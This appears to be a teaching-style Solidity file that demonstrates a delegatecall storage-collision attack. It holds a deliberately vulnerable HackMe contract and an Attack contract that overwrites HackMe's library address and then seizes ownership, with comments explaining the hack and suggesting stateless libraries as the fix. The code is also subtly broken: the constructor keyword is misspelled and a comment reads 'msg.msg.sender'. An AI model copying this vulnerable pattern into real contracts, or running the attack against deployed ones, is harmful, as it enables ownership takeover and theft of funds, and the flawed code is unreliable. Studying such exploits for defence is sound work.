// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Lib {
    uint public someNumber;

    function doSomething(uint newNumber) public {
        someNumber = newNumber;
    }
}


//the hack is in this contract, when delegating call if anyone calls doSomething, that "int" will override the libAddress, 

//to exploit this we send the address of the attack contract so that the new contract that HackMe delegates calls is the attack contract
//We create a function on our own contract with the same function selector that instead changes the owner to the address of the msg.msg.sender
//Which is the attack contract calling the doSomething function on HackMe
//To prevent this is better to use stateless libraries.
contract HackMe {
    address public libAddress;
    address public owner;
    uint public someNumber;

    cosntructor(address _libAddress) {
        libAddress = _libAddress;
        owner = msg.sender;
    }

    function doSomething(uint newNumber) public {
        libAddress.delegatecall(abi.encodeWithSignature("doSomething(uint256)", newNumber));
    }

}

contract Attack {
    address public libAddress;
    address public owner;
    uint public someNumber;
    HackMe public hackMeAddress;

    constructor(HackMe _hackMeAddress) {
        hackMeAddress = HackMe(_hackMeAddress);
    }

    function attack() public {
        hackMeAddress.doSomething(uint(uint160(address(this))));
        hackMeAddress.doSomething(1);
    }

    function doSomething(uint newNumber) public {
        owner = msg.sender;
    }
}